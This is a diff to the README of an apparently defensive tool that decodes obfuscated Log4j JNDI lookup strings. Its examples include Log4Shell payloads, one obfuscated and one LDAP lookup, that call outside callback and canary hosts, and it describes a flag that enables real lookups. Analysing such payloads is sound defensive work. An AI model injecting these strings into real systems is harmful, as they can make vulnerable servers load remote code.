@@ -15,11 +15,11 @@ For example : cat access.log | java -jar JndiLookup.jar
 
 If you pass a string to the command line, the tool will convert this string and exits (please escape all the '$' characters).
 
-For example : java -jar JndiLookup.jar java -jar JndiLookup.jar "\${jndi:\${lower:l}\${lower:d}a\${lower:p}://world443.log4j.bin\${upper:a}ryedge.io:80/callback}"
+For example : java -jar JndiLookup.jar java -jar JndiLookup.jar "\\${jndi:\\${lower:l}\\${lower:d}a\\${lower:p}://world443.log4j.bin\\${upper:a}ryedge.io:80/callback}"
 
 By default, the JNDI lookup is disabled (and replaced by a lookup function that will just add "jndi:" but it's possible to enable the real JNDI lookup by passing the "-X" parameter to JndiLookup ("-X" to be passed as the first parameter) ; PLEASE BE CAUTIOUS with this because it could lead to your system being compromised.
 
-For example : java -jar JndiLookup.jar -X "\${jndi:ldap://w8pcb14reujq65vic39pz9amv.canarytokens.com/a}"
+For example : java -jar JndiLookup.jar -X "\\${jndi:ldap://w8pcb14reujq65vic39pz9amv.canarytokens.com/a}"
 
 
 
